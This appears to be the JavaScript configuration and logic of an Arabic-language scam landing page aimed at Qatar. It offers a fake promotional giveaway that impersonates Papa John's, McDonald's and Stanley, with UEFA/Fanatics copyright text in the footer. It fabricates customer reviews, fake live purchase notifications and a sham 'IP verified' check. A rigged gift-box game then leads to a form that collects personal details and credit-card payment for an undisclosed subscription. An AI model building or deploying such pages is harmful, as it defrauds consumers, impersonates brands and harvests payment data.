const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "qa";
  const lang = "ar-QA";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "الحجم: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // أملأ هذه المعلومات في MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "هذا الأسبوع، يمكنك طلب منتج واحد فقط بسعر ترويجي.",
    text: `
    تهانينا!<br><br>
    لقد شاركت في عرض ستانلي: لديك الفرصة لشراء الترمس STANLEY QUENCHER H2.0 مع قالب الثلج بسعر <b>37 ريال</b> فقط!
    `,
  };

  const notifications = [
    {
      user: "مانويل س*****",
      location: "الدوحة، قطر",
      action: "لقد تلقيت المجوهرات للتو بسعر 1.95 ريال!",
      timeago: "منذ 15 ثانية",
    },
    {
      user: "كارلوس ب******",
      location: "الريان، قطر",
      action: "لقد تلقيت المجوهرات للتو بسعر 1.95 ريال!",
      timeago: "منذ 25 ثانية",
    },
  ];

  const reviewsArr = [
    {
      name: "ماري سميث",
      time: "منذ يوم",
      header: "بيتزا رائعة وخدمة ودية!",
      product: "26468781",
      image: "./src/img/review_1.jpg",
      review:
        "لقد ذهبت إلى العديد من محلات البيتزا، لكن بيتزا بابا جونز دائمًا مميزة. العجين مقرمش تمامًا، والإضافات دائمًا طازجة وسخية. الموظفون ودودون للغاية ومهتمون، مما يجعل تجربة تناول الطعام أفضل. أوصي بشدة ببيتزا البيبروني - إنها الأفضل!",
    },
    {
      name: "توماس جونز",
      time: "منذ يومين",
      header: "قيمة رائعة مقابل المال",
      product: "26468783",
      image: "./src/img/review_2.jpg",
      review:
        "بيتزا بابا جونز تقدم قيمة رائعة مقابل المال. البيتزا كبيرة، مليئة بالإضافات، وبأسعار معقولة جدًا. أحب خياراتهم المتنوعة، وصوص الثوم الخاص بهم لا بد من تجربته! إنها مكاني المفضل لليالي البيتزا العائلية.",
    },
    {
      name: "صوفي جونسون",
      time: "منذ يومين",
      header: "توصيل سريع وبيتزا لذيذة.",
      product: "26468784",
      image: "./src/img/review_3.jpg",
      review:
        "لقد طلبت التوصيل من بيتزا بابا جونز عدة مرات، ولم يخيبوا أملي أبدًا. البيتزا تصل دائمًا ساخنة وطازجة، والتوصيل سريع جدًا. خدمتهم ممتازة، والبيتزا لذيذة في كل مرة. خمس نجوم!",
    },
    {
      name: "جوليان ويليامز",
      time: "منذ أربعة أيام",
      header: "مثالية للتجمعات",
      product: "26468781",
      image: "./src/img/review_4.jpg",
      review:
        "بيتزا بابا جونز مثالية للتجمعات والحفلات. طلبنا عدة بيتزا كبيرة لحفلة عيد ميلاد، والجميع أعجبوا. كانت البيتزا لذيذة، مع توازن مثالي بين الجبن والإضافات. عملية الطلب عبر الإنترنت كانت سهلة، والتوصيل كان سريعًا. بالتأكيد مكاننا المفضل للبيتزا!",
    },
    {
      name: "كاميرون براون",
      time: "منذ سبعة أيام",
      header: "جودة رائعة باستمرار",
      product: "26468782",
      review:
        "بيتزا بابا جونز قدمت لنا دائمًا بيتزا ذات جودة رائعة. سواء تناول الطعام في المطعم أو الشراء الخارجي، التجربة دائمًا إيجابية. الموظفون ودودون، البيتزا لذيذة، والأسعار معقولة. أحب بيتزا الدجاج بالباربيكيو والبيكون - إنها رائعة!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "المراجعات والتقييمات",
    percent: "99%",
    rec: "تعليقات على هذا العرض",
  };

  const questions = {
    _of: "السؤال {1} من {2}: ",
    arr: [
      {
        q: "هل طلبت منتجات من ماكدونالدز من قبل؟",
        a: ["نعم، أطلب كثيرًا", "نعم، أطلب نادرًا", "لم أطلب أبدًا"],
      },
      {
        q: "هل ينبغي على ماكدونالدز الاستمرار في هذا النوع من الحملات الإعلانية؟",
        a: ["نعم، بالتأكيد!", "نعم، لكن يجب تغيير قائمة العروض", "لا"],
      },
      {
        q: "هل توصي بمنتجاتنا لأصدقائك؟",
        a: ["نعم", "لا"],
      },
    ],
  };

  const check = {
    title: "سيتم مراجعة إجابتك",
    arr: [
      "لقد أجبت على السؤال 3 من 3",
      "لا يُظهر عنوان IP الخاص بك أي طلبات سابقة",
      "تم التحقق من إجابتك",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "شكرًا لمشاركتك في الاستطلاع!",
        button: "جرب حظك",
        text: `
  <center>
      للحصول على قائمة عروض ماكدونالدز، يجب عليك اختيار صندوق الهدايا الصحيح.
      <br><br>
      لديك 3 محاولات، حظًا سعيدًا!
  </center>
            `,
      },
    },
    first: {
      texts: {
        header: "أوه، لا...",
        button: "حاول مرة أخرى",
        text: `
  <center>
      للأسف، هذه الهدية فارغة. لديك محاولتان متبقيتان، حظًا سعيدًا!
  </center>
            `,
      },
    },
    win: {
      texts: {
        header: "",
        button: "أكمل الطلب",
        text: `
  <center>
      <p style="color: #ffffff"></p>
      <br>
      انقر فوق الزر "أكمل الطلب"، واملأ النموذج وادفع الطلب.
      <br>
      <br>
      في غضون 3 إلى 5 أيام، ستتلقى طردًا في عنوانك مع بطاقة اشتراك وتعليمات.
  </center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "المعلومات الشخصية",
      fields: {
        name: {
          enabled: true,
          field: "الاسم الأول",
        },
        family: {
          enabled: true,
          field: "الاسم الأخير",
        },
        phone: {
          enabled: true,
          field: "رقم الهاتف",
        },
        email: {
          enabled: true,
          field: "عنوان البريد الإلكتروني",
        },
      },
    },
    delivery: {
      title: "التوصيل",
      fields: {
        city: {
          enabled: true,
          field: "المدينة",
        },
        address: {
          enabled: true,
          field: "عنوان التوصيل",
        },
        zip: {
          enabled: true,
          field: "الرمز البريدي",
        },
      },
    },
    payment: {
      title: "طرق الدفع",
      creditCard: "الدفع عبر الإنترنت بواسطة بطاقة الائتمان",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "تفاصيل الطلب",
      oldPrice: "66,00 QR",
      newPrice: "7,90 QR",
      size: "الحجم",
      subTotal: {
        title: "الإجمالي الفرعي",
        amount: "7,90 QR",
      },
      deliveryTime: {
        title: "وقت التوصيل",
        amount: "3 أيام",
      },
      delivery: {
        title: "التوصيل",
        amount: "0,00 QR",
      },
      total: {
        title: "الإجمالي",
        amount: "7,90 QR",
      },
      checkoutButton: "ادفع طلبك",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "٣ بيتزا كبيرة بابا",
      miniImg: "./src/img/slide1.jpg",
      images: ["./src/img/slide1.jpg"],
    },
    {
      id: "26468782",
      name: "بيتزا زستي إيطاليان تريو",
      miniImg: "./src/img/slide2.jpg",
      images: ["./src/img/slide2.jpg"],
    },
  ];



  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.. All rights reserved. No portion of this site may be reproduced or duplicated without the express permission of UEFA and/or Fanatics (as applicable). The words UEFA, UEFA Nations League, UEFA Nations League Finals, Finalissima, UEFA U21 Championships, UEFA EURO and UEFA Women’s EURO and all other UEFA marks, names, mascots and trophies are the property, registered trademarks, designs and/or copyright of UEFA. Store maintained and operated by Fanatics (International) Limited.",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});